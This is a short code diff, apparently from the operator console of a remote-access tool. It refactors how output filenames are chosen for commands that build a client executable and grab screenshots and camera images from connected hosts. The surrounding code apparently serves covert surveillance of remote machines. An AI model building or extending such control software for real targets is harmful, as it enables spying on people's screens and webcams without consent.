@@ -53,7 +53,7 @@ class Terminal:
                         print()
                         print(get_flags_as_table())
                 elif task == "generate app":
-                    name = flags.get("name") if flags.get("name") else setting["name_app_client"]
+                    name = flags.get("name", setting["name_app_client"])
                     if not name.endswith(".exe"): name += ".exe"
                     generateapp(name)
                     
@@ -62,7 +62,7 @@ class Terminal:
                         host = self.__server.get_host_by_id(flags.get("host"))
                         if isinstance(host, Host):
                             if task == "screenshot":
-                                name = flags.get("name") if flags.get("name") else f"{task}-{host.name}-{host.id}.png"
+                                name = flags.get("name", f"{task}-{host.name}-{host.id}.png")
                                 if not name.endswith(".png"): name += ".png"
                                 print("Waiting data ...\n")
                                 name = setting.get("path_server").joinpath(name).as_posix()
@@ -71,7 +71,7 @@ class Terminal:
                                     print(mssg)
 
                             elif task == "camera":
-                                name = flags.get("name") if flags.get("name") else f"{task}-{host.name}-{host.id}.png"
+                                name = flags.get("name", f"{task}-{host.name}-{host.id}.png") 
                                 if not name.endswith(".png"): name += ".png"
                                 print("Waiting data ...\n")
                                 name = setting.get("path_server").joinpath(name).as_posix()
